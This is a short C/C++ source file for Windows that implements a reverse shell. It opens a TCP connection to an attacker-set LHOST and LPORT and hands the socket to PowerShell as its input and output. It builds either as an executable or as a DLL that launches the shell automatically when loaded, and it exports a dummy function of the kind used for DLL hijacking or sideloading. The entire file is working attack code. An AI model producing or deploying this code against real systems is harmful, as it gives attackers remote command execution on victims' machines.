#include <stdio.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS 1
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#define STRINGIFY_IMPL(x) #x
#define STRINGIFY(x) STRINGIFY_IMPL(x)

static constexpr const char* host = STRINGIFY(LHOST);
static constexpr int port = LPORT;
static constexpr const char* shell = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe";
// "c:\\windows\\system32\\cmd.exe"

extern "C" __declspec(dllexport) void Nop() {
    return;
}

[[noreturn]] void ErrorExit(const char* fn, DWORD error) {
    LPSTR messageBuffer = nullptr;
    const size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, nullptr, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), reinterpret_cast<LPSTR>(&messageBuffer), 0, nullptr);
    if (size == 0) {
        wprintf(L"FormatMessageA: %lu\n", GetLastError());
    } else {
        wprintf(L"%s: %s\n", fn, messageBuffer);
    }
    LocalFree(messageBuffer);
    ExitProcess(error);
}

// source: http://web.archive.org/web/20210922030147/http://sh3llc0d3r.com/windows-reverse-shell-shellcode-i/
DWORD RunShell(__attribute__((unused)) LPVOID lpThreadParameter) {
    wprintf(L"connecting to %s:%d\n", host, port);

    WSADATA wsaData = {};
    int err = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (err != 0) {
        ErrorExit("WSAStartup", WSAGetLastError());
    }

    SOCKET socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (socket == INVALID_SOCKET) {
        ErrorExit("WSASocket", WSAGetLastError());
    }

    struct sockaddr_in target = {};
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(host);

    err = WSAConnect(socket, reinterpret_cast<SOCKADDR*>(&target), sizeof(target), nullptr, nullptr, nullptr, nullptr);
    if (err != 0) {
        ErrorExit("WSAConnect", WSAGetLastError());
    }

    wprintf(L"starting %s\n", shell);

    STARTUPINFO startinfo = {};
    startinfo.cb = sizeof(startinfo);
    startinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startinfo.hStdInput = startinfo.hStdOutput = startinfo.hStdError = reinterpret_cast<HANDLE>(socket);

    PROCESS_INFORMATION procinfo = {};
    err = CreateProcess(nullptr, const_cast<char*>(shell), nullptr, nullptr, true, 0, nullptr, nullptr, &startinfo, &procinfo);
    if (err == 0) {
        ErrorExit("CreateProcess", GetLastError());
    }

    return 0;
}

DWORD Spawn(LPTHREAD_START_ROUTINE fn) {
    wprintf(L"spawning thread\n");
    SECURITY_ATTRIBUTES lpThreadAttributes = {};
    const HANDLE thread = CreateThread(&lpThreadAttributes, 0, fn, nullptr, 0, 0);
    if (!thread) {
        ErrorExit("CreateThread", GetLastError());
    }
    WaitForSingleObject(thread, 1000);
    CloseHandle(thread);
    return 0;
}

BOOL APIENTRY DllMain(__attribute__((unused)) HMODULE hModule, DWORD fdwReason, __attribute__((unused)) LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        Spawn(RunShell);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return true;
}

int main() {
    return Spawn(RunShell);
}
